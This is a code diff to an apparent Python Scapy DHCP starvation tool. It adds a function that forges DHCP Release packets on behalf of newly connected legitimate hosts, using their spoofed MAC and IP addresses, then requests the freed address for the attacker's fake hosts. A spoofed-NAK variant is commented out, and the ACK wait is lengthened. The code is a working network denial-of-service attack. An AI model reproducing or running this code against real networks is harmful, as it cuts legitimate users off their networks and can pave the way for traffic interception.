@@ -316,6 +316,37 @@ def send_nak(host):
     scapy.sendp(dhcp_nak, verbose=False, iface=iface)
 
 
+def send_release_v2(mac_address, ip_address, hostname):
+    """
+    Send DHCP Release
+    """
+    # Finding the fake host's IP address to release
+    #host_ip = fake_host_dict[mac_address].ip_address
+    # Getting a random Trans ID
+    trans_id = get_transaction_id()
+    # Converting MAC addresses
+    mac_address = int(mac_address.replace(":", ""), 16).to_bytes(6, "big")
+    server_mac = int(dhcp_server_mac.replace(":", ""), 16).to_bytes(6, "big")
+    # Making DHCP Release packet
+    ether_header = scapy.Ether(src=mac_address, 
+                               dst=server_mac)
+    ip_header = scapy.IP(src=ip_address, 
+                         dst=dhcp_server_ip)
+    udp_header = scapy.UDP(sport=68, 
+                           dport=67)
+    bootp_field = scapy.BOOTP(chaddr=mac_address, 
+                              xid=trans_id,
+                              flags=0)
+    dhcp_field = scapy.DHCP(options=[("message-type", "release"),
+                                     ("server_id", dhcp_server_ip),
+                                     ("hostname", hostname), 
+                                     "end"])
+    dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)
+
+    scapy.sendp(dhcp_request, verbose=False, iface="eth0")
+    write_to_log(f"Releasing IP address {ip_address}")
+
+
 def handle_dhcp_packet(packet):
     """
     Listens for received DHCP packets
@@ -358,17 +389,17 @@ def handle_dhcp_packet(packet):
         fake_macs = fake_host_dict.keys()
         existing_macs = existing_host_dict.keys()
         # Getting host's MAC address (sender)
-        #mac = dhcp_opts["client_id"]
-        #client_id = mac_to_str(mac)
-        #client_id = mac_to_str(dhcp_opts["client_id"])
         client_id = mac_to_str(packet[scapy.BOOTP].chaddr)
-
+        '''
         if client_id not in fake_macs and client_id in existing_macs:
             # Esto alomejor no es necesario
             # Updating client's requested IP address
             existing_host_dict[client_id].ip_address = dhcp_opts["requested_addr"]
         # We need to ensure this received packet is not from a fake host
         elif client_id not in fake_macs and client_id not in existing_macs:
+        '''
+        # In received packet is not from any of ours fake hosts, in from a recently connected host
+        if client_id not in fake_macs:
             # If host doesn't exist on dictionary, we create it
             host = existing_host()
             # Setting his params
@@ -381,10 +412,16 @@ def handle_dhcp_packet(packet):
             host.transaction_id = packet[scapy.BOOTP].xid
             # Adding existing host to diccionary
             existing_host_dict[client_id] = host
+            # Sending DHCP Release
+            send_release_v2(host.mac_address, host.ip_address, host.hostname)
+
+            # Now we try to get the recently released IP address
+            send_discover(iface)
+            '''
             # Sending DHCP NAK
             send_nak(host)
             write_to_log(f"Sending NAK to: {host.ip_address}, {host.mac_address}, {host.hostname}, {host.transaction_id}")
-
+            '''
     # Option 5: DHCP ACK, IP address successfully linked to host       
     elif scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 5:
         # Getting client info - RFC951
@@ -563,7 +600,7 @@ def main():
 
     # Getting all avalaible IP from network
     starve_dhcp_server(max_hosts)
-    time_to_wait_to_receive_all_ack = 5  # seconds
+    time_to_wait_to_receive_all_ack = 30  # seconds
     write_to_log(f"Waiting {time_to_wait_to_receive_all_ack} second(s) for the rest of DHCP ACK to be received")
     time.sleep(time_to_wait_to_receive_all_ack)
 
